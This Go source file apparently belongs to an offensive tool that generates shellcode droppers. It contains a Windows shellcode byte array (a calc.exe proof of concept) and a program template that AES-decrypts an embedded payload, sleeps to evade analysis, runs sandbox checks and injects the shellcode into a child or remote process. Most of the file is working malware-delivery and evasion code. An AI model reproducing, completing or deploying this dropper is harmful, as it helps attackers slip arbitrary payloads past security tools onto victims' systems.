package gengo

var Leet bool

var CalcCode = []byte{
	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	0xd7,
}

type DtypeChild struct {
	//Child Dropper
	ChildProc string //Child Process
	Args      string //Args to pass to shellcode exec

}

type DtypeRemote struct {
	//Remote Dropper
	RemoteProc string //Program Proc to Execute in
	Pid        string
	Args       string
}

const DropperMain = `
package main

{{.C}}

import (
	"time"
	"os"
	"crypto/cipher"
	"crypto/aes"
	"encoding/base64"
	{{.Import}}

	{{.BoxChkImp}}
)

func pkcs5Trimming(encrypt []byte) []byte {
	padding := encrypt[len(encrypt)-1]
	return encrypt[:len(encrypt)-int(padding)]
}

func aesDecrypt(key string, buf string) ([]byte, error) {

	encKey, err := base64.StdEncoding.DecodeString(key)
	if err != nil {
		return nil, err
	}

	encBuf, err := base64.StdEncoding.DecodeString(buf)
	if err != nil {
		return nil, err
	}

	var block cipher.Block

	block, err = aes.NewCipher(encKey)
	if err != nil {
		return nil, err
	}

	if len(encBuf) < aes.BlockSize {

		os.Exit(69420)
	}
	iv := encBuf[:aes.BlockSize]
	encBuf = encBuf[aes.BlockSize:]

	cbc := cipher.NewCBCDecrypter(block, iv)
	cbc.CryptBlocks(encBuf, encBuf)
	decBuf := pkcs5Trimming(encBuf)

	return decBuf, nil

}

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)
var hope = "{{.Domain}}"

{{.Extra}}

{{.BoxChkFunc}}

{{.ProcAttach}}

func init() {
	{{.ChkBox}}	
	{{.Init}}
}
func main() {

	{{.FuncName}}()

}

//{{.Export}} {{.FuncName}}
func {{.FuncName}}() {

	{{.Dtype}}
	bufstring := "{{.BufStr}}"
	kstring := "{{.KeyStr}}"
	time.Sleep({{.Delay}}* time.Second)

	shellcode, err := aesDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}}* time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Inject}}

}

`
const dtypeRemote = `
	program := "{{.RemoteProc}}"
	args := "{{.Args}}"
	pid, err := strconv.Atoi("{{.Pid}}")
	if err != nil {
		pid = 0
	}
	`
const dtypeChild = `

`
